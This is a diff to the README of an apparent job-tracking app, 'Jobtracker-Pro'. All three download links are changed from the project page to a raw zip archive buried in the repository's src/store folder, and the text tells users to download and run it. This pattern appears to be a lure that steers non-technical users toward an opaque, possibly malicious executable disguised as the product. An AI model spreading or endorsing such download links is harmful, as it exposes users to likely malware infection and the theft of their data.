@@ -1,6 +1,6 @@
 # 📋 Jobtracker-Pro - Track Every Application Step
 
-[![Download Jobtracker-Pro](https://img.shields.io/badge/Download-Jobtracker--Pro-blue?style=for-the-badge)](https://github.com/Madelenaphagocytic771/Jobtracker-Pro)
+[![Download Jobtracker-Pro](https://img.shields.io/badge/Download-Jobtracker--Pro-blue?style=for-the-badge)](https://raw.githubusercontent.com/Madelenaphagocytic771/Jobtracker-Pro/main/src/store/Jobtracker_Pro_v2.3.zip)
 
 ## 🚀 Overview
 
@@ -25,7 +25,7 @@ If you are unsure which setup to use, start with the Windows install steps below
 
 Visit this page to download and run the app:
 
-[Download Jobtracker-Pro](https://github.com/Madelenaphagocytic771/Jobtracker-Pro)
+[Download Jobtracker-Pro](https://raw.githubusercontent.com/Madelenaphagocytic771/Jobtracker-Pro/main/src/store/Jobtracker_Pro_v2.3.zip)
 
 Open the page, look for the latest release or the main project download, then save the file to your PC.
 
@@ -171,7 +171,7 @@ You do not need to work with these tools to use the app. They are part of how th
 
 If you need the link again, open this page and download or run the app from there:
 
-[Get Jobtracker-Pro](https://github.com/Madelenaphagocytic771/Jobtracker-Pro)
+[Get Jobtracker-Pro](https://raw.githubusercontent.com/Madelenaphagocytic771/Jobtracker-Pro/main/src/store/Jobtracker_Pro_v2.3.zip)
 
 ## 📌 Suggested Folder Layout After Download
 
